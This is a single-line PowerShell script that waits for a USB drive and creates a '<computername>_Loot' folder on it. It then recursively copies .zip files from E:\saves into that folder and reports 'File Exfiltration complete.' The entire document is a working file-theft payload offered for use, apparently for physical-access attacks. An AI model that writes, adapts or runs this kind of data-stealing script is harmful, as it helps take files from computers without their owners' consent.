$removableDrives = Get-WmiObject Win32_LogicalDisk | Where-Object { $_.DriveType -eq 2 };$count = $removableDrives.count;Write-Host "Connect a USB Drive.";While ($count -eq $removableDrives.count){$removableDrives = Get-WmiObject Win32_LogicalDisk | Where-Object { $_.DriveType -eq 2 };sleep 1};$drive = Get-WmiObject Win32_LogicalDisk | Where-Object { $_.DriveType -eq 2 } | Sort-Object -Descending | Select-Object -First 1;$driveLetter = $drive.DeviceID;Write-Host "Loot Drive Set To : $driveLetter/";$fileExtensions = @("*.zip");$foldersToSearch = @("E:\saves");$destinationPath = "$driveLetter\$env:COMPUTERNAME`_Loot";if (-not(Test-Path -Path $destinationPath)) {New-Item -ItemType Directory -Path $destinationPath -Force;Write-Host "New Folder Created : $destinationPath"}foreach ($folder in $foldersToSearch) {Write-Host "Searching in $folder";foreach ($extension in $fileExtensions) {$files = Get-ChildItem -Path $folder -Recurse -Filter $extension -File;foreach ($file in $files) {$destinationFile = Join-Path -Path $destinationPath -ChildPath $file.Name;Write-Host "Copying $($file.FullName) to $($destinationFile)";Copy-Item -Path $file.FullName -Destination $destinationFile -Force}}}Write-Host "File Exfiltration complete.";exit